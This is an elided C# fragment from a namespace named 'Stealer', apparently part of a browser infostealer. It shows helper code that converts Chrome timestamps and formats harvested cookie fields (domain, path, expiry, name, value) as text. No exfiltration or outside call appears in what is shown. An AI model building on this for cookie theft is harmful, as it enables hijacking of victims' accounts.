...
namespace Stealer
{
    internal sealed class cBrowserUtils
    {
        public static DateTime UnixTimeStampToDateTime(double unixTimeStamp, bool isChrome = false)
        {
            ...
            if(isChrome) dtDateTime = new DateTime(1601, 1, 1, 0, 0, 0, 0, System.DateTimeKind.Utc);
        ...
        {
            //return JsonConvert.SerializeObject(cCookie);
            return String.Format("Key:\t{0}\r\nPath:\t{1}\r\nExpireUtc:\t{2}\r\nName:\t{3}\r\nValue:\t{4}\r\n", 
                cCookie.domain, cCookie.sPath, cCookie.expirationDate, cCookie.name, cCookie.value);
        }
